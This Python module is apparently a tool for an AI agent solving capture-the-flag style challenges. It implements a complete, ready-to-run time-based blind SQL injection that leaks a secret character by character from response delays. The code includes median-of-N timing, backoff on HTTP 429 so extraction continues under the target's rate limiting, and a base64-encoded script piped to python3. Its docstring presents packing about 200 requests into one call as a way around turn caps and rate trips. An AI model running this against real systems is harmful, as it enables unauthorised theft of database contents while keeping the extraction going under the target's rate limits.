"""time_blind — TIME-BASED blind extraction exploit primitive.

Sibling of solver._blind_extract, but the oracle is a RESPONSE DELAY, not a content
marker: a payload that makes the DB sleep(delay) when the injected boolean is TRUE.
Binary-search each char of a secret via `ascii(substr(sub,pos,1))>N`; a request whose
(median) wall-clock elapsed >= threshold means the condition was TRUE. Collapses ~200
paced oracle requests into ONE tool call — the fix for the turn-cap/rate-trip failure
mode when there is no content oracle to diff against.

Paced (sleep between requests), exponential backoff on HTTP 429, median-of-N sampling to
fight timing jitter. Reach for it when blind_extract has no true_marker to key on.
"""
import base64


def _script(params: dict) -> str:
    """The primitive as a self-contained stdlib-only script for the sandbox."""
    import json
    return "import json,sys,time,statistics,urllib.request,urllib.error\n" + \
           "from urllib.parse import quote\n" + \
           f"P=json.loads(r'''{json.dumps(params)}''')\n" + r'''
OR   = P["oracle_url"]
INJ  = P["inject_template"]          # wraps a bool as a delay, has {cond} and {sleep}
SLP  = P["sleep_expr"]               # DB sleep expr, has {d} for delay seconds
SUB  = P["subquery"]
CHARF, LENF = P["char_template"], P["length_template"]
DELAY_S   = float(P["delay_s"])
THRESH    = float(P["threshold_s"])
REPS      = max(1, int(P["reps"]))
MAXLEN    = int(P["max_len"])
DEPTH     = int(P["encode_depth"])
PACE      = float(P["delay_between"])
reqs=[0]

def enc(s,n):
    for _ in range(n): s=quote(s,safe='')
    return s

def payload(cond):
    sleep = SLP.replace("{d}", repr(DELAY_S))
    return INJ.replace("{cond}", cond).replace("{sleep}", sleep)

def _time_once(url):
    t0=time.monotonic()
    try:
        urllib.request.urlopen(url,timeout=DELAY_S+15).read()
    except urllib.error.HTTPError as e:
        if e.code==429:
            time.sleep(2.0); return None            # signal caller to retry/backoff
        try: e.read()
        except Exception: pass
    except Exception:
        pass
    return time.monotonic()-t0

def ask(cond):
    """True iff the injected condition is true, judged by the MEDIAN elapsed of REPS samples."""
    reqs[0]+=1
    url=OR.replace("{cond}", enc(payload(cond), DEPTH))
    samples=[]
    for _ in range(REPS):
        for a in range(8):                          # backoff loop per sample
            el=_time_once(url)
            if el is None:
                time.sleep(2*(a+1)); continue       # 429 -> back off, resample
            samples.append(el); break
        if PACE: time.sleep(PACE)
    if not samples: return False
    return statistics.median(samples) >= THRESH

# calibrate: char 1 of any nonempty secret exists -> ascii(...)>0 must be TRUE (slow)
cal = CHARF % (SUB,1,">",0)
if not ask(cal):
    print("TIME_BLIND_FAIL: calibration probe never crossed the delay threshold "
          "(threshold=%.3fs, delay=%.3fs, reps=%d). Injection likely blocked or the "
          "sleep payload/threshold is wrong (check inject_template/sleep_expr, raise "
          "delay_s, or raise reps for jitter). reqs=%d" % (THRESH,DELAY_S,REPS,reqs[0]))
    sys.exit(0)

def bsearch(pos):        # smallest v with ascii(char)>v FALSE => the char's ascii value
    lo,hi=32,126
    while lo<hi:
        mid=(lo+hi)//2
        if ask(CHARF % (SUB,pos,">",mid)): lo=mid+1
        else: hi=mid
    return lo

# length first (bounded); if unsupported, per-char end-detection still stops the loop
L=MAXLEN
if ask(LENF % (SUB,">",0)):
    lo,hi=1,MAXLEN
    while lo<hi:
        mid=(lo+hi)//2
        if ask(LENF % (SUB,">",mid)): lo=mid+1
        else: hi=mid
    L=lo
out=[]
for pos in range(1,L+1):
    if not ask(CHARF % (SUB,pos,">",31)):           # no printable char -> end of string
        break
    out.append(chr(bsearch(pos)))
    if len(out)>=MAXLEN: break
print("TIME_BLIND_OK reqs=%d threshold=%.3fs\nRECOVERED: %s"%(reqs[0],THRESH,"".join(out)))
'''


def run(sb, args: dict) -> str:
    """Validate args, run the timing-oracle extraction in the sandbox, return its output."""
    if "{cond}" not in (args.get("oracle_url") or ""):
        return ("time_blind error: oracle_url must contain the literal token {cond} where "
                "the time-delay injection is spliced, e.g. 'http://host/api?q=1{cond}'.")
    inj = args.get("inject_template") or "||(case when {cond} then {sleep} else 0 end)"
    if "{cond}" not in inj or "{sleep}" not in inj:
        return ("time_blind error: inject_template must contain both {cond} and {sleep} "
                "tokens, e.g. '||(case when {cond} then {sleep} else 0 end)'.")
    sleep_expr = args.get("sleep_expr") or "sleep({d})"
    if "{d}" not in sleep_expr:
        return "time_blind error: sleep_expr must contain the {d} token for delay seconds, e.g. 'sleep({d})' or 'pg_sleep({d})'."
    delay_s = float(args.get("delay_s") or 2.0)
    # ponytail: threshold defaults to 60% of the payload delay — clear of network jitter for a
    # multi-second sleep; for sub-second delays the caller should pass reps>1 and tune threshold_s.
    threshold_s = float(args.get("threshold_s") or delay_s * 0.6)
    params = {
        "oracle_url": args["oracle_url"],
        "inject_template": inj,
        "sleep_expr": sleep_expr,
        "subquery": args.get("subquery") or "(select flag from secrets)",
        "char_template": args.get("char_template") or "ascii(substr({sub},{pos},1)){op}{val}",
        "length_template": args.get("length_template") or "length({sub}){op}{val}",
        "delay_s": delay_s,
        "threshold_s": threshold_s,
        "reps": int(args.get("reps") or 1),
        "max_len": int(args.get("max_len") or 48),
        "encode_depth": int(args.get("encode_depth") or 0),
        "delay_between": float(args.get("delay_between") or 0.0),
    }
    # char/length templates use %-style (sub,pos,op,val) inside the script; normalize the
    # caller-facing {sub}/{pos}/{op}/{val} tokens to the positional %s/%d the script expects.
    params["char_template"] = (params["char_template"]
                               .replace("{sub}", "%s").replace("{pos}", "%d")
                               .replace("{op}", "%s").replace("{val}", "%d"))
    params["length_template"] = (params["length_template"]
                                 .replace("{sub}", "%s").replace("{op}", "%s")
                                 .replace("{val}", "%d"))
    script = _script(params)
    b64 = base64.b64encode(script.encode()).decode()
    return sb.bash(f"echo {b64} | base64 -d | python3 -", timeout=300)
